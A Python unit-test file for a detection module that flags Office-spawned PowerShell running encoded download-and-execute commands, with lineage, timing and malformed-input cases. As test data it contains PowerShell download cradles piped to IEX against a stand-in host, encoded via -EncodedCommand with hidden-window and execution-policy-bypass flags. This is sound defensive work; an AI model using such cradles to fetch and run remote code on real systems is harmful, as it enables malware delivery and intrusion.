"""Synthetic offline tests; PowerShell source strings are never executed."""
import base64
from copy import deepcopy
import importlib.util
import json
from pathlib import Path
import socket
import subprocess
import sys
import unittest
from unittest.mock import patch

ROOT = Path(__file__).resolve().parents[2]
spec = importlib.util.spec_from_file_location('powershell', ROOT / 'detections/processing/powershell.py')
ps = importlib.util.module_from_spec(spec)
spec.loader.exec_module(ps)

WEB = "(New-Object System.Net.WebClient).DownloadString('https://payload.invalid/demo.ps1')"
IWR = "(Invoke-WebRequest -Uri 'https://payload.invalid/demo.ps1').Content"


def encode(script):
    return base64.b64encode(script.encode('utf-16-le')).decode()


def event(eid, image, parent_id=None, parent_name=None, seconds=0, host='lab-host'):
    pids = {'office': 1000, 'cmd': 2000, 'ps': 3000, 'extra': 4000}
    process = {'name': image, 'entity_id': eid, 'pid': pids.get(eid, 5000)}
    if parent_id:
        process['parent'] = {'entity_id': parent_id, 'name': parent_name,
                             'pid': pids.get(parent_id, 5000)}
    return {'@timestamp': '2026-11-13T10:00:%02dZ' % seconds,
            'event': {'id': 'event-' + eid, 'category': ['process'], 'type': ['start']},
            'host': {'id': host, 'os': {'type': 'windows'}}, 'process': process}


def chain(script='IEX (' + WEB + ')', indirect=False):
    office = event('office', 'winword.exe')
    cmd = event('cmd', 'cmd.exe', 'office', 'winword.exe', 1)
    power = event('ps', 'powershell.exe', 'cmd' if indirect else 'office',
                  'cmd.exe' if indirect else 'winword.exe', 2)
    power['process']['args'] = ['powershell.exe', '-EncodedCommand', encode(script)]
    power['process']['command_line'] = ' '.join(power['process']['args'])
    return [office, cmd, power] if indirect else [office, power]


class ScriptTests(unittest.TestCase):
    def test_each_download_and_execution_shape(self):
        for download in [WEB, IWR]:
            for script, pattern in [('IEX (' + download + ')', 'direct_argument'),
                                    (download + ' | Invoke-Expression', 'direct_pipeline'),
                                    ('$text = ' + download + '; IEX $text', 'single_variable')]:
                with self.subTest(script=script):
                    self.assertEqual(ps.analyze_script(script), {'status': 'download_and_execute', 'pattern': pattern})

    def test_fixture_manifest(self):
        cases = json.loads((ROOT / 'detections/tests/fixtures/powershell_scripts.json').read_text())
        for case in cases:
            with self.subTest(case=case['id']):
                self.assertEqual(ps.analyze_script(case['script'])['status'], case['expected'])

    def test_comments_casing_and_literal_url(self):
        self.assertEqual(ps.analyze_script('# IEX fake\n' + WEB.upper() + ' | iEx # trailing')['status'], 'download_and_execute')
        self.assertEqual(ps.analyze_script('Write-Output "DownloadString IEX"')['status'], 'no_download')

    def test_no_keyword_shortcut_or_ignored_remainder(self):
        scripts = [WEB + '; IEX $unrelated', '$a=' + WEB + '; IEX $b',
                   '$a=' + WEB + '; $a="changed"; IEX $a',
                   WEB + '; Start-Process anything', 'if ($true) { IEX (' + WEB + ') }',
                   WEB.replace("'https://payload.invalid/demo.ps1'", '"https://$host/demo.ps1"'),
                   WEB.replace("'https://payload.invalid/demo.ps1'", "'file:///tmp/demo'"),
                   'function IEX { }; IEX (' + WEB + ')',
                   '(Invoke-WebRequest -Uri "https://payload.invalid/demo") | IEX',
                   "(New-Object System.Net.WebClient)'.'DownloadString('https://payload.invalid/x') | IEX"]
        for script in scripts:
            with self.subTest(script=script):
                self.assertEqual(ps.analyze_script(script)['status'], 'unknown')

    def test_size_token_nesting_and_malformed_limits(self):
        for script in ['x' * (ps.MAX_SCRIPT_BYTES + 1), ';' * (ps.MAX_TOKENS + 1),
                       '(' * 20 + WEB + ')' * 20, 'IEX (' + WEB, '"unterminated']:
            with self.subTest(size=len(script)):
                self.assertEqual(ps.analyze_script(script)['status'], 'unknown')


class ProcessingTests(unittest.TestCase):
    def prepared(self, events):
        result = ps.prepare_events(events)
        self.assertEqual(len(result), 1)
        return result[0]['p1']

    def unknown(self, events):
        d = self.prepared(events)
        self.assertEqual(d['powershell']['script_evidence']['status'], 'unknown')
        self.assertNotIn('priority', d)
        return d

    def test_direct_and_cmd_priority_and_references(self):
        for indirect in [False, True]:
            for script, severity, risk in [(WEB, 'medium', 47), ('IEX (' + WEB + ')', 'high', 73)]:
                with self.subTest(indirect=indirect, severity=severity):
                    events = chain(script, indirect)
                    d = self.prepared(events)
                    self.assertEqual(d['priority'], {'severity': severity, 'risk_score': risk})
                    self.assertEqual(d['evidence']['event_ids'], [e['event']['id'] for e in events])
                    self.assertTrue(d['provisional_scores'])
                    self.assertEqual(d['lineage']['path'], 'office_cmd_powershell' if indirect else 'office_powershell')

    def test_benign_and_realistic_false_positive(self):
        benign = self.prepared(chain("Write-Output 'Hello'"))
        self.assertEqual(benign['powershell']['script_evidence']['status'], 'no_download')
        self.assertNotIn('priority', benign)
        # Approved internal automation satisfies the same behavior: expected FP, no broad allowlist.
        fp = self.prepared(chain('IEX (' + WEB.replace('payload.invalid', 'automation.example.invalid') + ')'))
        self.assertEqual(fp['priority']['severity'], 'high')

    def test_missing_wrong_host_and_duplicate_parents(self):
        for modify in ['missing', 'wrong_host', 'duplicate', 'conflict', 'pid_only']:
            events = chain()
            if modify == 'missing':
                events = events[1:]
            elif modify == 'wrong_host':
                events[0]['host']['id'] = 'other-host'
            elif modify == 'duplicate':
                events.insert(0, deepcopy(events[0]))
            elif modify == 'conflict':
                events[-1]['process']['parent']['name'] = 'excel.exe'
            else:
                del events[-1]['process']['parent']['entity_id']
            with self.subTest(modify=modify):
                self.unknown(events)

    def test_malformed_ancestor_event_ids_remain_unverified(self):
        for indirect in (False, True):
            for index in range(2 if indirect else 1):
                for value in (None, '', '   ', 42, True, [], ['id'], {'id': 'bad'}):
                    with self.subTest(indirect=indirect, ancestor=index, value=value):
                        events = chain(indirect=indirect)
                        events[index]['event']['id'] = value
                        derived = self.unknown(events)
                        self.assertFalse(derived['lineage']['verified'])
                        self.assertNotIn('evidence', derived)

    def test_reused_pid_does_not_replace_entity_identity(self):
        events = chain(indirect=True)
        previous = event('old-process', 'explorer.exe')
        previous['process']['pid'] = events[-1]['process']['pid']
        previous['@timestamp'] = '2026-11-12T10:00:00Z'
        events.insert(0, previous)
        derived = self.prepared(events)
        self.assertEqual(derived['priority']['severity'], 'high')
        self.assertNotIn(previous['event']['id'], derived['evidence']['event_ids'])

    def test_unrelated_parent_cycle_and_deeper_path(self):
        events = chain(); events[0]['process']['name'] = 'explorer.exe'; events[-1]['process']['parent']['name'] = 'explorer.exe'
        self.unknown(events)
        events = chain(); events[-1]['process']['parent']['entity_id'] = 'ps'
        self.unknown(events)
        events = chain(indirect=True); extra = event('extra', 'cmd.exe', 'office', 'winword.exe')
        events[1]['process']['parent'] = {'entity_id': 'extra', 'name': 'cmd.exe'}; events.insert(1, extra)
        self.unknown(events)

    def test_time_order_missing_time_and_window(self):
        for value in [None, '2026-11-13T10:01:00Z', 'invalid', '2026-11-13T10:00:00']:
            events = chain(); events[0]['@timestamp'] = value
            self.unknown(events)

    def test_inclusive_ancestry_boundary_and_out_of_order_input(self):
        events = chain(indirect=True); events[-1]['@timestamp'] = '2026-11-13T10:02:01Z'
        self.assertEqual(self.prepared(list(reversed(events)))['priority']['severity'], 'high')
        events[-1]['@timestamp'] = '2026-11-13T10:02:01.001Z'
        self.unknown(events)

    def test_long_lived_office_does_not_break_ancestry(self):
        for indirect in [False, True]:
            events = chain(indirect=indirect)
            events[0]['@timestamp'] = '2026-11-12T10:00:00Z'
            self.assertEqual(self.prepared(events)['priority']['severity'], 'high')

    def test_incomplete_script_and_untrusted_classification(self):
        events = chain(WEB + '; unknown-command')
        events[-1]['p1'] = {'priority': {'severity': 'high'}, 'lineage': {'verified': True}}
        self.unknown(events)

    def test_no_mutation_and_deterministic_one_result(self):
        events = chain(indirect=True); original = deepcopy(events)
        first = ps.prepare_events(events)
        self.assertEqual(events, original)
        self.assertEqual(first, ps.prepare_events(events))
        self.assertEqual(len(first), 1)
        self.assertIn('document_id', first[0]['p1'])

    def test_supported_images_and_options(self):
        for image in ['powershell.exe', 'pwsh.exe', 'PoWeRsHeLl.ExE']:
            for option in ['-EncodedCommand', '-enc', '-ec', '-e', '-ENC']:
                events = chain()
                events[-1]['process']['name'] = image
                events[-1]['process']['args'] = [image, '-NoProfile', '-w', 'Hidden', '-ep', 'Bypass', option, encode(WEB)]
                self.assertEqual(self.prepared(events)['priority']['severity'], 'medium')

    def test_launcher_boundaries_and_malformed_encoding(self):
        cases = [None, ['powershell.exe', '-EncodedCommand'],
                 ['powershell.exe', '-File', 'file.ps1', '-EncodedCommand', encode(WEB)],
                 ['powershell.exe', '-Command', 'Write-Output', '-EncodedCommand', encode(WEB)],
                 ['powershell.exe', '-EncodedArguments', encode(WEB)],
                 ['powershell.exe', '-e', '!!!'], ['powershell.exe', '-e', 'YQ=='],
                 ['powershell.exe', '-e', encode(WEB), 'extra'],
                 ['powershell.exe', '-e', 'A' * (ps.MAX_ENCODED_CHARS + 1)],
                 ['powershell.exe', '-e', encode('\x00')],
                 ['wrong.exe', '-e', encode(WEB)]]
        for args in cases:
            events = chain(); events[-1]['process']['args'] = args
            with self.subTest(args_type=type(args).__name__):
                self.unknown(events)

    def test_missing_identity_or_wrong_event_type(self):
        for field in ['id', 'entity', 'host', 'category', 'os']:
            events = chain()
            if field == 'id':
                events[-1]['event'].pop('id')
            elif field == 'entity':
                events[-1]['process'].pop('entity_id')
            elif field == 'host':
                events[-1]['host'].pop('id')
            elif field == 'category':
                events[-1]['event']['category'] = 'network'
            else:
                events[-1]['host']['os']['type'] = 'linux'
            self.unknown(events)

    def test_invalid_input_envelope_rejected_without_guessing(self):
        for events in [None, [None], [{'host': 'bad'}], [{'process': {'name': 1}}],
                       [{'host': {'os': []}}], [{'process': {'parent': []}}]]:
            with self.subTest(events=events):
                with self.assertRaises(ValueError):
                    ps.prepare_events(events)
        events = chain(); events[-1]['process']['parent']['entity_id'] = ['bad']
        self.unknown(events)
        events = chain(); events[-1]['host']['id'] = ['bad']
        self.unknown(events)

    def test_no_process_execution_or_network(self):
        with patch.object(subprocess, 'Popen', side_effect=AssertionError('execution forbidden')), \
             patch.object(socket, 'socket', side_effect=AssertionError('network forbidden')):
            self.assertEqual(self.prepared(chain())['priority']['severity'], 'high')

    def test_cli_preserves_raw_evidence(self):
        fixture = ROOT / 'detections/tests/fixtures/office_cmd_high.json'
        result = subprocess.run([sys.executable, '-B', str(ROOT / 'detections/processing/powershell.py'), str(fixture)],
                                capture_output=True, text=True, check=True)
        data = json.loads(result.stdout)
        self.assertEqual(data['original_events'], json.loads(fixture.read_text()))
        self.assertEqual(data['prepared_events'][0]['p1']['priority']['risk_score'], 73)


if __name__ == '__main__':
    unittest.main()
